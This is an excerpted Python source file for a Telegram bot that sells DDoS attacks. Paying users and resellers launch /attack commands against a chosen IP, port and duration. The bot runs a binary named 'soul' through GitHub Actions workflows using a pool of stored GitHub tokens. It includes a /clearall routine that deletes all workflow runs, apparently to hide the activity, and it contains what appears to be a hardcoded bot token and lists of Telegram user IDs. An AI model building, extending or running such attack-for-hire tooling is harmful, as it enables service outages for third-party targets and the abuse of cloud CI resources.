...
BOT_TOKEN = "8588406348:AAF1Cj4naIpwhOeCqyuzn_ZSPAMBYN9j-mU"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
# ADMIN_IDS = [521756472, 7733336238,7772881209] 
ADMIN_IDS = [6443423824, 6144653744, 6214482391, 6144653744]
OWNER_IDS = [8242664737]
...
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if is_owner(user_id) or is_admin(user_id):
        await update.message.reply_text(
            ...
            "**ᴜsᴇʀ ᴄᴏᴍᴍᴀɴᴅs:**\n"
            "• /start - sᴛᴀʀᴛ ʙᴏᴛ\n"
            "• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> - ᴀᴛᴛᴀᴄᴋ ᴏɴᴄᴇ\n"
            "• /status - ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs\n"
            "• /stop - sᴛᴏᴘ ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ\n"
            "• /id - ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n"
            "• /myaccess - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss\n"
            "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴀᴄᴄᴇss ᴋᴇʏ\n"
            "• /help - sʜᴏᴡ ᴛʜɪs ʜᴇʟᴘ\n\n"
            "**ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:**\n"
            "• /add <ɪᴅ> <ᴅᴀʏs> - ᴀᴅᴅ ᴜsᴇʀ ᴀᴄᴄᴇss\n"
            "• /remove <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ᴜsᴇʀ ᴀᴄᴄᴇss\n"
            "• /userslist - ᴀʟʟ ᴀᴄᴄᴇsᴛᴘᴇᴅ ᴜsᴇʀs\n"
            "• /approveuserslist - ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs ʟɪsᴛ\n"
            "• /ownerlist - ᴀʟʟ ᴏᴡɴᴇʀs ʟɪsᴛ\n"
            "• /adminlist - ᴀʟʟ ᴀᴅᴍɪɴs ʟɪsᴛ\n"
            "• /resellerlist - ᴀʟʟ ʀᴇsᴇʟʟᴇʀs ʟɪsᴛ\n"
            "• /listgrp - ᴀʟʟ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs\n"
            "• /pricelist - ᴜsᴇʀ ᴘʀɪᴄᴇs\n"
            "• /resellerpricelist - ʀᴇsᴇʟʟᴇʀ ᴘʀɪᴄᴇs\n\n"
            "**ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs:**\n"
            "• /maintenance <ᴏɴ/ᴏғғ> - ᴛᴏɢɢʟᴇ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ\n"
            "• /restart - ʀᴇsᴛᴀʀᴛ ʙᴏᴛ ᴄᴏᴍᴘʟᴇᴛᴇʟʏ\n"
            "• /setcooldown <sᴇᴄᴏɴᴅs> - sᴇᴛ ᴀᴛᴛᴀᴄᴋ ᴄᴏᴏʟᴅᴏᴡɴ\n"
            "• /setmaxattack <ɴᴜᴍʙᴇʀ> - sᴇᴛ ᴍᴀx ᴀᴛᴛᴀᴄᴋs\n"
            "• /gentrailkey <ʜᴏᴜʀs> - ɢᴇɴᴇʀᴀᴛᴇ ᴛʀɪᴀʟ ᴋᴇʏ\n"
            "• /broadcast - sᴇɴᴅ ᴍᴇssᴀɢᴇ ᴛᴏ ᴀʟʟ ᴜsᴇʀs\n\n"
            "**ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs (ᴀᴄᴄᴏᴜɴᴛs):**\n"
            "• /addowner <ɪᴅ> - ᴀᴅᴅ ᴏᴡɴᴇʀ\n"
            "• /deleteowner <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ\n"
            "• /addreseller <ɪᴅ> - ᴀᴅᴅ ʀᴇsᴇʟʟᴇʀ\n"
            "• /removereseller <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀ\n\n"
            "**ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs (ᴛᴏᴋᴇɴs):**\n"
            "• /addtoken - ᴀᴅᴅ ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴ\n"
            "• /tokens - sʜᴏᴡ ᴀʟʟ ᴛᴏᴋᴇɴs\n"
            "• /removetoken <ɴᴜᴍʙᴇʀ> - ʀᴇᴍᴏᴠᴇ ᴛᴏᴋᴇɴ\n"
            "• /removexpiredtoken - ʀᴇᴍᴏᴠᴇ ᴇxᴘɪʀᴇᴅ ᴛᴏᴋᴇɴs\n"
            "• /clearall - ᴄʟᴇᴀʀ ᴀʟʟ ᴏʟᴅ ᴡᴏʀᴋғʟᴏᴡ ʀᴜɴs\n\n"
            "**ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs (ᴜᴛɪʟɪᴛɪᴇs):**\n"
            "• /binary_upload - ᴜᴘʟᴏᴀᴅ ʙɪɴᴀʀʏ ғɪʟᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
...
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    def monitor_attack_completion(duration):
        try:
            time.sleep(duration)
            global current_attack, cooldown_until
            current_attack = None
            ...
            save_attack_state()
            save_user_attack_counts(user_attack_counts)
            logger.info(f"✅ Attack completed automatically after {duration} seconds")
        except Exception as e:
            logger.error(f"❌ Error in monitor_attack_completion: {e}")
    
    monitor_thread = threading.Thread(target=monitor_attack_completion, args=(attack_duration,))
...
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if attack_status["status"] == "running":
        ...
        message = (
            ...
            f"📊 ᴅᴇʙᴜɢ: ᴄᴜʀʀᴇɴᴛ_ᴀᴛᴛᴀᴄᴋ={current_attack is not None}"
        )
...
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇsᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ."
        )
        return
    ...
    await update.message.reply_text(
        "🔄 **ʀᴇsᴛᴀʀᴛɪɴɢ ʙᴏᴛ...**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴀʟʟ ғᴜɴᴄᴛɪᴏɴs ᴡɪʟʟ ʙᴇ ʀᴇʟᴏᴀᴅᴇᴅ."
    )
...
# /clearall command - Delete all GitHub workflows
async def clearall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearall command - Delete all workflows from GitHub repos"""
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ᴏᴡɴᴇʀs ᴏɴʟʏ**")
        return
    ...
    progress_msg = await update.message.reply_text("🔄 **ᴄʟᴇᴀʀɪɴɢ ᴀʟʟ ᴡᴏʀᴋғʟᴏᴡs**\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...")
    ...
    for token_data in github_tokens:
        ...
        try:
            # Use direct GitHub REST API to get and delete workflow runs
            ...
            while True:
                ...
                if response.status_code == 200:
                    ...
                    for run in runs:
                        try:
                            delete_url = f"https://api.github.com/repos/{repo_name}/actions/runs/{run['id']}"
                            delete_response = requests.delete(delete_url, headers=headers)
                            
                            if delete_response.status_code == 204:
                                deleted_count += 1
                                logger.info(f"✅ Deleted run {run['id']} from {repo_name}")
                            elif delete_response.status_code == 403:
                                error_count += 1
                                logger.warning(f"⚠️ Run {run['id']} cannot be deleted (still running or protected)")
                            else:
                                error_count += 1
                                logger.error(f"❌ Failed to delete run {run['id']}: {delete_response.status_code}")
                        except Exception as e:
                            error_count += 1
                            logger.error(f"❌ Exception deleting run: {e}")
                    ...
                    # Other errors
                    error_count += 1
                    logger.error(f"❌ Failed to fetch runs: {response.status_code}")
                    break
            
            total_deleted += deleted_count
            total_errors += error_count
            results.append(f"✅ {username}: {deleted_count} ᴅᴇʟᴇᴛᴇᴅ, {error_count} ᴇʀʀᴏʀs")
    ...
    result_msg = "🗑️ **ᴀʟʟ ᴡᴏʀᴋғʟᴏᴡs ᴄʟᴇᴀʀᴇᴅ**\n"
    result_msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    for result in results:
        result_msg += f"{result}\n"
    result_msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    result_msg += f"📊 **ᴛᴏᴛᴀʟ**: {total_deleted} ᴅᴇʟᴇᴛᴇᴅ | {total_errors} ᴇʀʀᴏʀs"
        ...
        def upload_to_repo(token_data):
            try:
                ...
                try:
                    ...
                    results.append((token_data['username'], True, "Replaced"))
                except Exception as e:
